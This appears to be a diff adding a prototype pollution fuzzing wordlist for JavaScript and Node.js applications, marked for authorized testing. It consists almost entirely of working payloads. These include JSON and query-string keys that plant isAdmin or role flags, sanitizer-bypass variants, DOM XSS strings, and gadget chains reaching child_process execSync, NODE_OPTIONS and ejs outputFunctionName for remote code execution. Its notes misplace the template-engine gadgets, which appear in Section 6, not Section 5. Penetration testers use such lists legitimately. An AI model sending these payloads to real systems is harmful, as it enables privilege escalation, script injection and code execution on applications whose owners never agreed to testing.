@@ -1,0 +1,84 @@
+# ============================================================
+# Prototype Pollution Fuzzing Wordlist (JavaScript / Node.js)
+# Usage: send as JSON body keys, URL query params (bracket/dot notation),
+#        or client-side via URL fragment/query for DOM-based testing.
+# For authorized security testing only.
+# ============================================================
+
+# ---------------------------------------
+# SECTION 1: Basic detection payloads (JSON body)
+# ---------------------------------------
+{"__proto__":{"polluted":"yes"}}
+{"__proto__":{"toString":"polluted"}}
+{"constructor":{"prototype":{"polluted":"yes"}}}
+{"__proto__":{"isAdmin":true}}
+{"__proto__":{"admin":true}}
+{"__proto__":{"role":"admin"}}
+{"__proto__":{"hasOwnProperty": null}}
+{"__proto__":{"length":0}}
+{"user":{"__proto__":{"isAdmin":true}}}
+{"a":{"__proto__":{"polluted":"yes"}}}
+
+# ---------------------------------------
+# SECTION 2: Nested / bypass variants for merge-based sanitizers
+# ---------------------------------------
+{"constructor":{"prototype":{"isAdmin":true}}}
+{"__proto__.polluted":"yes"}
+{"a":{"b":{"__proto__":{"polluted":"yes"}}}}
+{"__proto__":{"__proto__":{"polluted":"yes"}}}
+{"constructor.prototype.polluted":"yes"}
+{"a[__proto__][polluted]":"yes"}
+{"__pro__proto__to__":{"polluted":"yes"}}
+{"__prot__proto__o__":{"polluted":"yes"}}
+
+# ---------------------------------------
+# SECTION 3: URL query param / bracket notation form
+# ---------------------------------------
+?__proto__[polluted]=yes
+?__proto__[isAdmin]=true
+?__proto__.polluted=yes
+?constructor[prototype][polluted]=yes
+?constructor.prototype.polluted=yes
+?user[__proto__][isAdmin]=true
+?a[__proto__][b]=yes
+
+# ---------------------------------------
+# SECTION 4: Client-side DOM prototype pollution (URL fragment/query, jQuery/lodash targets)
+# ---------------------------------------
+?__proto__[src]=x
+?__proto__[srcdoc]=<img src=x onerror=alert(1)>
+#__proto__[src]=x
+?__proto__[innerHTML]=<img src=x onerror=alert(1)>
+?__proto__[test]=alert(1)
+?constructor[prototype][src]=x
+
+# ---------------------------------------
+# SECTION 5: Lodash/merge/extend library-specific gadget triggers
+# ---------------------------------------
+{"__proto__":{"env":{"NODE_OPTIONS":"--require /proc/self/environ"}}}
+{"__proto__":{"shell":"/bin/sh -c 'id'"}}
+{"__proto__":{"execArgv":["--eval=require('child_process').execSync('id')"]}}
+{"__proto__":{"NODE_OPTIONS":"--inspect=0.0.0.0:9229"}}
+
+# ---------------------------------------
+# SECTION 6: Confirming pollution via reflected app behavior
+# ---------------------------------------
+{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('id');x"}}
+{"__proto__":{"block":"{{7*7}}"}}
+{"__proto__":{"escape":"a"}}
+
+# ---------------------------------------
+# NOTES
+# ---------------------------------------
+# - Section 1/2 are for server-side Node.js apps using vulnerable
+#   merge/clone/extend functions (older lodash, jQuery.extend, etc.)
+#   on user-controlled JSON.
+# - Confirm pollution by requesting an unrelated endpoint afterward and
+#   checking if the injected property leaked into Object.prototype
+#   (e.g. an app-wide config flag suddenly appears true).
+# - Section 4 targets client-side/DOM pollution, chained into XSS via
+#   sinks like innerHTML, src, or srcdoc that read from Object.prototype.
+# - Section 5 (template-engine gadget chains, e.g. via ejs/pug
+#   outputFunctionName) can lead to RCE — high impact, confirm scope
+#   before testing.
+# - Only use against systems you are explicitly authorized to test.
